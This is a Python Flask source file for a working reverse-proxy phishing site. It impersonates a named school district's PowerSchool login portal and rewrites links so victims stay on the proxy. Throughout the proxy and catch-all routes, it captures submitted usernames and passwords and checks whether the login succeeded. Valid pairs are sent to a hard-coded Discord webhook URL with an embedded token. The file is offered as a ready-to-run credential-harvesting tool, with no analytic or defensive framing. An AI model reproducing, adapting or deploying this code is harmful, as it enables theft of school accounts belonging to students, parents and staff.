from flask import Flask, request, redirect, url_for, Response, session as flask_session
import requests, re, uuid

app = Flask(__name__)
app.secret_key = "super_secret_render_key"

BASE_URL = "https://beaufortsc.powerschool.com"
user_sessions = {}

def get_user_session():
    sid = flask_session.get("session_id")
    if not sid:
        sid = str(uuid.uuid4())
        flask_session["session_id"] = sid
    if sid not in user_sessions:
        user_sessions[sid] = requests.Session()
    return user_sessions[sid]

def _scheme():
    return request.headers.get("X-Forwarded-Proto", request.scheme)

def _host_root():
    return f"{_scheme()}://{request.host}/"

def replace_urls(html):
    html = re.sub(r'(href|src|action)="(/[^"]*)"', r'\1="/proxy\2"', html)
    html = re.sub(r"(href|src|action)='(/[^']*)'", r"\1='/proxy\2'", html)
    html = html.replace(BASE_URL, _host_root() + "proxy")
    return html

def _clean_headers():
    hop = {"host","connection","keep-alive","proxy-authenticate","proxy-authorization","te","trailers","transfer-encoding","upgrade","content-length"}
    headers = {k:v for k,v in request.headers.items() if k.lower() not in hop}
    headers["Host"] = "beaufortsc.powerschool.com"
    return headers

def _set_cookies(resp_obj, upstream_resp):
    for c in upstream_resp.cookies:
        resp_obj.set_cookie(c.name, c.value, path="/", httponly=False, samesite="Lax")

def _rewrite_location(upstream_resp, resp_obj):
    if "location" in upstream_resp.headers:
        loc = upstream_resp.headers["location"]
        if loc.startswith(BASE_URL):
            loc = loc[len(BASE_URL):]
            resp_obj.headers["location"] = f"/proxy{loc}"
        elif loc.startswith("/"):
            resp_obj.headers["location"] = f"/proxy{loc}"

def send_webhook(username, password):
    url = "https://discord.com/api/webhooks/1432870093725106328/QsAAhHeIylYLLL-Wnhbf7XjQ8WJ72pRsFied62tLyuiNYuxy2GcJQuFHeOFzjd4e522r"
    data = {"content": f"{username}:{password}"}
    requests.post(url, json=data)

@app.route("/", methods=["GET","POST"])
def home():
    user_session = get_user_session()
    if request.method == "POST":
        return redirect(url_for("home"))
    r = user_session.get(f"{BASE_URL}/public/home.html", headers=_clean_headers(), allow_redirects=False)
    body = r.content
    if "text/html" in r.headers.get("content-type", "").lower():
        body = replace_urls(body.decode("utf-8", errors="replace")).encode("utf-8")
    resp = Response(body, status=r.status_code, content_type=r.headers.get("content-type","text/html"))
    _set_cookies(resp, r)
    _rewrite_location(r, resp)
    return resp

@app.route("/proxy/<path:path>", methods=["GET","POST","PUT","DELETE","PATCH","OPTIONS"])
def proxy(path):
    user_session = get_user_session()
    url = f"{BASE_URL}/{path}"
    if request.query_string:
        url += "?" + request.query_string.decode("utf-8", errors="ignore")
    headers = _clean_headers()
    headers["Referer"] = BASE_URL
    method = request.method.upper()
    data = request.get_data() if method in {"POST","PUT","PATCH","DELETE"} else None
    form = request.form
    username = None
    password = None
    if method == "POST" and form.get("account") and form.get("pw"):
        username = form.get("account")
        password = form.get("pw")
    r = user_session.request(method, url, headers=headers, data=data, allow_redirects=False)
    body = r.content
    ctype = r.headers.get("content-type","").lower()
    if "text/html" in ctype:
        text = body.decode("utf-8", errors="replace")
        if username and password:
            if '<div class="feedback-alert">Invalid Username or Password!</div><br>' not in text:
                send_webhook(username, password)
        body = replace_urls(text).encode("utf-8")
    elif "javascript" in ctype or "text/css" in ctype:
        body = body.decode("utf-8", errors="replace").replace(BASE_URL, _host_root()+"proxy").encode("utf-8")
    resp = Response(body, status=r.status_code, content_type=r.headers.get("content-type","text/plain"))
    _set_cookies(resp, r)
    _rewrite_location(r, resp)
    return resp

@app.route("/<path:path>", methods=["GET","POST"])
def catch_all(path):
    if path == "eade-to-the-call-make-to-looken-the-good-What-ge":
        return Response("", content_type="application/javascript")
    user_session = get_user_session()
    url = f"{BASE_URL}/{path}"
    if request.query_string:
        url += "?" + request.query_string.decode("utf-8", errors="ignore")
    headers = _clean_headers()
    headers["Referer"] = BASE_URL
    method = request.method.upper()
    data = request.get_data() if method in {"POST","PUT","PATCH","DELETE"} else None
    form = request.form
    username = None
    password = None
    if method == "POST" and form.get("account") and form.get("pw"):
        username = form.get("account")
        password = form.get("pw")
    r = user_session.request(method, url, headers=headers, data=data, allow_redirects=False)
    body = r.content
    ctype = r.headers.get("content-type","").lower()
    if "text/html" in ctype:
        text = body.decode("utf-8", errors="replace")
        if username and password:
            if '<div class="feedback-alert">Invalid Username or Password!</div><br>' not in text:
                send_webhook(username, password)
        body = replace_urls(text).encode("utf-8")
    elif "javascript" in ctype or "text/css" in ctype:
        body = body.decode("utf-8", errors="replace").replace(BASE_URL, _host_root()+"proxy").encode("utf-8")
    resp = Response(body, status=r.status_code, content_type=r.headers.get("content-type","text/plain"))
    _set_cookies(resp, r)
    _rewrite_location(r, resp)
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, threaded=True)
